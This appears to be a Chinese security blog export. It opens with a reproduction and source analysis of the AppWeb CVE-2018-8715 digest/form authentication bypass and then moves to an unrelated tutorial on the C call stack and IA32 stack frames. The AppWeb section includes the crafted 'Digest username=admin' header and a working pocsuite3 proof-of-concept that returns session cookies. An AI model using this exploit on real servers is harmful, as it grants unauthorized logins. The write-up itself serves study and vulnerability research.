<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问页面如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222103500284.png" alt="image-20201222103500284"></p>
<p>构造的get数据包，加入我们构造的usename字段，注意用户名是已经存在的才可以进行构造</p>
<p>Authorization: Digest username=admin</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104134406.png" alt="image-20201222104134406"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104813555.png" alt="image-20201222104813555"></p>
<p>即可登陆成功</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参<br>数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>漏洞位置在<a href="https://github.com/embedthis/appweb/blob/v7.0.2/paks/http/dist/httpLib.c">appweb/paks/http/dist/httpLib.c 2</a></p>
<p>首先是<code>function authCondition()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    This condition is used to implement all user authentication for routes</span><br><span class="line"> *&#x2F;</span><br><span class="line">static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line">    cchar       *username, *password;</span><br><span class="line"></span><br><span class="line">    assert(conn);</span><br><span class="line">    assert(route);</span><br><span class="line"></span><br><span class="line">    auth &#x3D; route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        &#x2F;* Authentication not required *&#x2F;</span><br><span class="line">        return HTTP_ROUTE_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpIsAuthenticated(conn)) &#123;</span><br><span class="line">        httpGetCredentials(conn, &amp;username, &amp;password);</span><br><span class="line">        if (!httpLogin(conn, username, password)) &#123;</span><br><span class="line">            if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">                if (auth &amp;&amp; auth-&gt;type) &#123;</span><br><span class="line">                    (auth-&gt;type-&gt;askLogin)(conn);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    httpError(conn, HTTP_CODE_UNAUTHORIZED, &quot;Access Denied, login required&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">            &#125;</span><br><span class="line">            return HTTP_ROUTE_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpCanUser(conn, NULL)) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.check&quot;, &quot;error&quot;, &quot;msg:&#39;Access denied, user is not authorized for access&#39;&quot;);</span><br><span class="line">        if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">            httpError(conn, HTTP_CODE_FORBIDDEN, &quot;Access denied. User is not authorized for access.&quot;);</span><br><span class="line">            &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* OK to accept route. This does not mean the request was authenticated - an error may have been already generated *&#x2F;</span><br><span class="line">    return HTTP_ROUTE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数负责调用两个用于认证处理的函数：<code>getCredentials</code>和<code>httpLogin</code>，注意到<code>httpGetCredentials</code>周围缺少检查，这将会在稍后起到作用</p>
<p><code>httpGetCredentials()</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the</span><br><span class="line">    rx-&gt;authDetails will contain the credentials and the parseAuth callback will be invoked to parse.</span><br><span class="line">    Otherwise, it is expected that &quot;username&quot; and &quot;password&quot; fields are present in the request parameters.</span><br><span class="line">    This is called by authCondition which thereafter calls httpLogin</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line"></span><br><span class="line">    assert(username);</span><br><span class="line">    assert(password);</span><br><span class="line">    *username &#x3D; *password &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    auth &#x3D; conn-&gt;rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;type) &#123;</span><br><span class="line">        if (conn-&gt;authType &amp;&amp; !smatch(conn-&gt;authType, auth-&gt;type-&gt;name)) &#123;</span><br><span class="line">            if (!(smatch(auth-&gt;type-&gt;name, &quot;form&quot;) &amp;&amp; conn-&gt;rx-&gt;flags &amp; HTTP_POST)) &#123;</span><br><span class="line">                &#x2F;* If a posted form authentication, ignore any basic|digest details in request *&#x2F;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (auth-&gt;type-&gt;parseAuth &amp;&amp; (auth-&gt;type-&gt;parseAuth)(conn, username, password) &lt; 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        *username &#x3D; httpGetParam(conn, &quot;username&quot;, 0);</span><br><span class="line">        *password &#x3D; httpGetParam(conn, &quot;password&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数接收两个指向数组的指针用于从请求中解析<code>username</code>和<code>password</code>。既然<code>authCondition</code>没有进行参数检查，那么<code>parseAuth</code>失败也无关紧要。这意味着我们能够插入<code>WWW-Authenticate header</code>或者post任何我们想要的认证数据</p>
<p><code>httpLogin()</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Login the user and create an authenticated session state store</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpLogin(HttpConn *conn, cchar *username, cchar *password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpRx          *rx;</span><br><span class="line">    HttpAuth        *auth;</span><br><span class="line">    HttpSession     *session;</span><br><span class="line">    HttpVerifyUser  verifyUser;</span><br><span class="line"></span><br><span class="line">    rx &#x3D; conn-&gt;rx;</span><br><span class="line">    auth &#x3D; rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!username || !*username) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.login.error&quot;, &quot;error&quot;, &quot;msg:&#39;missing username&#39;&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!auth-&gt;store) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No AuthStore defined&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((verifyUser &#x3D; auth-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        if (!auth-&gt;parent || (verifyUser &#x3D; auth-&gt;parent-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            verifyUser &#x3D; auth-&gt;store-&gt;verifyUser;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!verifyUser) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No user verification routine defined on route %s&quot;, rx-&gt;route-&gt;pattern);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;username &amp;&amp; *auth-&gt;username) &#123;</span><br><span class="line">        &#x2F;* If using auto-login, replace the username *&#x2F;</span><br><span class="line">        username &#x3D; auth-&gt;username;</span><br><span class="line">        password &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(verifyUser)(conn, username, password)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(auth-&gt;flags &amp; HTTP_AUTH_NO_SESSION) &amp;&amp; !auth-&gt;store-&gt;noSession) &#123;</span><br><span class="line">        if ((session &#x3D; httpCreateSession(conn)) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            &#x2F;* Too many sessions *&#x2F;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username);</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_IP, conn-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">    rx-&gt;authenticated &#x3D; 1;</span><br><span class="line">    rx-&gt;authenticateProbed &#x3D; 1;</span><br><span class="line">    conn-&gt;username &#x3D; sclone(username);</span><br><span class="line">    conn-&gt;encoded &#x3D; 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一函数会检查username是否为空，当存在session时，password指针可以为空，所以设置空密码指针，即使返回错误，也不会被authCondition检查，允许我们绕过身份验证</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222111637408.png" alt="image-20201222111637408"></p>
<p>用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class AppWebPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;003&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;ssd-disclosure.com&#x2F;ssd-advisory-appweb-authentication-bypass-digest-and-forms&#x2F;&#39;]</span><br><span class="line">	name &#x3D; &#39;AppWeb CVE-2018-8715&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.embedthis.com&#x2F;&#39;</span><br><span class="line">	appName &#x3D; &#39;AppWeb&#39;</span><br><span class="line">	appVersion &#x3D; &#39;&lt;7.0.3&#39;</span><br><span class="line">	vulType &#x3D; &#39;Login Bypass&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			session</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	def _options(self):</span><br><span class="line">		o &#x3D; OrderedDict()</span><br><span class="line">		o[&quot;username&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;这个poc需要用户登录，请输入登录账号&#39;, require&#x3D;True)</span><br><span class="line">		return o</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		payload &#x3D; self.get_option(&quot;username&quot;)</span><br><span class="line">		#payload &#x3D; &quot;username&#x3D;&#123;0&#125;&quot;.format(self.get_option(&quot;username&quot;))</span><br><span class="line">		url &#x3D; self.url</span><br><span class="line">		headers&#x3D;&#123;</span><br><span class="line">			&#39;Authorization&#39;:  &#39;Digest username&#x3D;&quot;&#39; +str(payload) +&#39;&quot;&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		# proxies&#x3D;&#123;</span><br><span class="line">		# &#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">		# &#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">		# &#125;</span><br><span class="line">		r &#x3D; requests.get(url, headers&#x3D;headers)</span><br><span class="line">		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;set-cookie&#39;] &#x3D; r.headers[&#39;set-cookie&#39;]</span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		return self._verify()</span><br><span class="line"></span><br><span class="line">register_poc(AppWebPoc)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222135500449.png" alt="image-20201222135500449"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>AppWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言函数调用栈(一)</title>
    <url>/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%B8%80/</url>
    <content><![CDATA[<blockquote>
<p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。</p>
<p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p>
</blockquote>
<a id="more"></a>

<h2 id="1-寄存器分配"><a href="#1-寄存器分配" class="headerlink" title="1 寄存器分配"></a>1 寄存器分配</h2><p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。</p>
<p>   Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200903004820751.png" alt="image-20200903004820751"></p>
<p>图1 IA32处理器寄存器</p>
<p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器，如一些特殊的算术操作指令imull/mull/cltd/idivl/divl要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax (lower32-bit)中；又如函数返回值通常保存在%eax中，等等。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义(如图中所示)。</p>
<p>   对于寄存器%eax、%ebx、%ecx和%edx，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</p>
<p>   在x86处理器中，EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p>
<p>   注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p>
<p>   不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位。</p>
<p>   编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。</p>
<blockquote>
<p>`【扩展阅读】<strong>栈帧指针寄存器</strong></p>
<p>为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。</p>
<p>因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。</p>
<p>在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。`</p>
</blockquote>
<h2 id="2-寄存器使用约定"><a href="#2-寄存器使用约定" class="headerlink" title="2 寄存器使用约定"></a>2 寄存器使用约定</h2><p> 程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。</p>
<p>   根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p>
<p>   当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p>
<h2 id="3-栈帧结构"><a href="#3-栈帧结构" class="headerlink" title="3 栈帧结构"></a>3 栈帧结构</h2><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p>
<p>   编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p>
<p>   栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p>
<p>   为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p>
<p> 函数调用栈的典型内存布局如下图所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200903012700201.png" alt="image-20200903012700201"></p>
<p>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。 此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p>
<p>从图中可以看出，函数调用时入栈顺序为</p>
<p><strong>实参N<del>1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1</del>N</strong></p>
<p> 其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
<p>   EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p>
<p>   若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271650059007975.jpg" alt="img"></p>
<p>在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。</p>
<p>   以下代码用于函数栈布局示例：</p>
<p></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &#x2F;&#x2F;StackFrame.c</span><br><span class="line"> 2 #include &lt;stdio.h&gt;</span><br><span class="line"> 3 #include &lt;string.h&gt;</span><br><span class="line"> 4 </span><br><span class="line"> 5 struct Strt&#123;</span><br><span class="line"> 6     int member1;</span><br><span class="line"> 7     int member2;</span><br><span class="line"> 8     int member3;</span><br><span class="line"> 9 &#125;;</span><br><span class="line">10 </span><br><span class="line">11 #define PRINT_ADDR(x)     printf(&quot;&amp;&quot;#x&quot; &#x3D; %p\n&quot;, &amp;x)</span><br><span class="line">12 int StackFrameContent(int para1, int para2, int para3)&#123;</span><br><span class="line">13     int locVar1 &#x3D; 1;</span><br><span class="line">14     int locVar2 &#x3D; 2;</span><br><span class="line">15     int locVar3 &#x3D; 3;</span><br><span class="line">16     int arr[] &#x3D; &#123;0x11,0x22,0x33&#125;;</span><br><span class="line">17     struct Strt tStrt &#x3D; &#123;0&#125;;</span><br><span class="line">18     PRINT_ADDR(para1); &#x2F;&#x2F;若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span><br><span class="line">19     PRINT_ADDR(para2);</span><br><span class="line">20     PRINT_ADDR(para3);</span><br><span class="line">21     PRINT_ADDR(locVar1);</span><br><span class="line">22     PRINT_ADDR(locVar2);</span><br><span class="line">23     PRINT_ADDR(locVar3);</span><br><span class="line">24     PRINT_ADDR(arr);</span><br><span class="line">25     PRINT_ADDR(arr[0]);</span><br><span class="line">26     PRINT_ADDR(arr[1]);</span><br><span class="line">27     PRINT_ADDR(arr[2]);</span><br><span class="line">28     PRINT_ADDR(tStrt);</span><br><span class="line">29     PRINT_ADDR(tStrt.member1);</span><br><span class="line">30     PRINT_ADDR(tStrt.member2);</span><br><span class="line">31     PRINT_ADDR(tStrt.member3);</span><br><span class="line">32     return 0;</span><br><span class="line">33 &#125;</span><br><span class="line">34 </span><br><span class="line">35 int main(void)&#123;</span><br><span class="line">36     int locMain1 &#x3D; 1, locMain2 &#x3D; 2, locMain3 &#x3D; 3;</span><br><span class="line">37     PRINT_ADDR(locMain1);</span><br><span class="line">38     PRINT_ADDR(locMain2);</span><br><span class="line">39     PRINT_ADDR(locMain3);</span><br><span class="line">40     StackFrameContent(locMain1, locMain2, locMain3);</span><br><span class="line">41     printf(&quot;[locMain1,2,3] &#x3D; [%d, %d, %d]\n&quot;, locMain1, locMain2, locMain3);</span><br><span class="line">42     memset(&amp;locMain2, 0, 2*sizeof(int));</span><br><span class="line">43     printf(&quot;[locMain1,2,3] &#x3D; [%d, %d, %d]\n&quot;, locMain1, locMain2, locMain3);</span><br><span class="line">44     return 0;</span><br><span class="line">45 &#125;</span><br></pre></td></tr></table></figure>

<p>编译链接并执行后，输出打印如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271651489169470.jpg" alt="img"></p>
<p>函数栈布局示例如下图所示。为直观起见，低于起始高地址0xbfc75a58的其他地址采用点记法，如0x.54表示0xbfc75a54，以此类推。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271652449633815.jpg" alt="img"></p>
<p> 内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</p>
<p>   函数调用以值传递时，传入的实参(locMain1<del>3)与被调函数内操作的形参(para1</del>3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p>
<p>   此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p>
<p>   注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。</p>
<blockquote>
<p>【扩展阅读】<strong>函数局部变量布局方式</strong></p>
<p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。</p>
<p>基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p>
</blockquote>
<h1 id="4-堆栈操作"><a href="#4-堆栈操作" class="headerlink" title="4 堆栈操作"></a>4 堆栈操作</h1><p>   函数调用时的具体步骤如下：</p>
<p>   1) 主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</p>
<p>   注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</p>
<p>   2) 主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</p>
<p>   3) 若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p>
<p>   4) 被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p>
<p>   5) 被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</p>
<p>   6) 一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p>
<p>   7) 恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p>
<p>   8) 被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p>
<p>   9) 主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p>
<p>   步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p>
<p>   以下介绍函数调用过程中的主要指令。</p>
<p>   <strong>压栈**</strong>(push)**：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p>
